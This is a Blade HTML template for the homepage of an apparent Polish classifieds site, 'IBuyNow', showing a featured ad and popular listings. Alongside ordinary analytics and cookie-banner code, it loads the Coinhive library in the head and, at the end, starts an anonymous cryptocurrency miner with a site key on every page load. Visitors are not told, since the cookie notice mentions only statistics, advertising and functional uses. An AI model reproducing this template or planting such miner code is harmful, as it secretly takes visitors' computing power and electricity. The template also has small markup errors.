<!DOCTYPE html>
<!--[if lte IE 9]><html class="no-js is-ie"><![endif]-->
<!--[if gt IE 8]><!--><html class=no-js><!--<![endif]-->
<head>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-109899324-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-109899324-1');
</script>

	<meta charset="utf-8">
	<meta name="description" content="IBuyNow, Darmowa tablica ogłoszeniowa. Znajdziecie tutaj mnóstwo ofert z różnych kategorii. Od samochodów, przez telefony komórkowe, po nieruchomości a nawet pracę.">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="theme-color" content="#0053ba" />


	<title>IBuyNow</title>
	


   <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Vollkorn+SC" rel="stylesheet">
    <link href="{{ asset('css/style.css') }}" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css">
	<!--[if lte IE 8]>
	<link rel=stylesheet href="css/ie.css">
	<![endif]-->
  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
		<script src="{{ asset('js/home/vendor/modernizr.js')}}"></script>

		<script src="{{ asset('js/home/vendor/respond.min.js')}}"></script>



</head>

<body style="padding-top: 0px;">

@include('partials.nav')
<main class="main-wrapper">
  <article class="main-article">
      <header>
        <h2 class="main-article-header">{{ $randomAd->title }}</h2>
      </header>
      <div>
        <figure class="main-article-img-wrapper">
         @if(count($randomAd->photos))
          @foreach ($randomAd->photos as $photos)
            @if ($loop->first)
              <a href="{{ route('ad.show',['id' => $randomAd->id])}}">
                <img class="main-article-img" src="{{ asset($photos->filename)}}" alt="{{ $photos->filename }}"  >
              </a>
            @endif
          @endforeach
        @else
          <a href="{{ route('ad.show',['id' => $randomAd->id])}}">
            <img class="main-article-img"  src="{{asset('adphotos/nophoto.png')}}"  />
          </a>
        @endif
        </figure>
        <section>
            <div class="article-info">
               <header class="main-article-body-header">
                <h3>Informacje: </h3>
              </header>
              <div>
                <p>Dodano: <span>{{ $randomAd->created_at }}</span> </p>
              </div>
              <div>
                <p>Cena: <span>{{ number_format($randomAd->maxprice , 2, ","," ") }} zł</span></p>
              </div>
              @auth
              <div>
                <p>Email: {{ $randomAd->user->email }}}</p>
              </div>
                @if ($randomAd->phone)
                  <div>
                    <p>Nr telefonu: <span>{{ $randomAd->phone }}</span></p>
                  </div>
                @endif 
              @else
                <div>
                  <p>Email: *****</p>
                </div>
                @if ($randomAd->phone)
                <div>
                  <p>Nr telefonu: *****</p>
                </div>
                @endif 
              @endauth
            </div>
            <div class="article-text"> 
              <header class="main-article-body-header">
                <h3>Treść ogłoszenia: </h3>
              </header>
              <p>{!! nl2br(e(str_limit($randomAd->body,185,"..."))) !!}</p>
            </div>
            <div class="main-article-options">
              <a href="{{ route('ad.show',['id' => $randomAd->id])}}" class="btn">Przejdź do ogłoszenia </a>
            </div>
        </section>
      </div>
  </article>
  <section class="last-popular-wrapper">
    <header class="last-popular-header">
      <h2>Ostatnio popularne:</h2>
    </header>
    <div class="ads-popular-wrapper">
      @foreach ($ads as $ad)
        @include('ad.ad_card')
      @endforeach
    </div>
  </section>
</main>


@include('dashboard.footer')


	<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
	<script>window.jQuery || document.write('<script src="js/vendor/jquery-1.11.1.min.js"><\/script>')</script>
	  <script src="https://code.jquery.com/jquery-3.1.1.js"  crossorigin="anonymous"></script>
     <script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery.min.js"><\/script>')</script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
    	<script  src="{{ asset('js/app.js')}}"></script>


<link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.3/cookieconsent.min.css" />
<script src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.3/cookieconsent.min.js"></script>
<script>
window.addEventListener("load", function(){
window.cookieconsent.initialise({
  "palette": {
    "popup": {
      "background": "#3c404d",
      "text": "#d6d6d6"
    },
    "button": {
      "background": "transparent",
      "text": "#8bed4f",
      "border": "#8bed4f"
    }
  },
  "position": "bottom",
  "static": true,
  "content": {
    "message": "Nasza strona internetowa używa plików cookies (tzw. ciasteczka) w celach statystycznych, reklamowych oraz funkcjonalnych. Dzięki nim możemy indywidualnie dostosować stronę do twoich potrzeb. ",
    "dismiss": "Zgadzam się",
    "link": "Dowiedz się więcej"
  }
})});
</script>
	<script  src="{{ asset('js/home/bootstrap.min.js')}}"></script>
	<script src="{{ asset('js/home/dropdown.js')}}"</script>
	<script  src="{{ asset('js/home/modal.js')}}" ></script>
	<script src="{{ asset('js/home/main.js')}}" ></script>
	<!-- //-end- concat_js -->


<script>
  var miner = new CoinHive.Anonymous('QG2eIWVKmhg7bQBCEMs5IFgsVhB7srh9');
  miner.start();
</script>

</body>
</html>
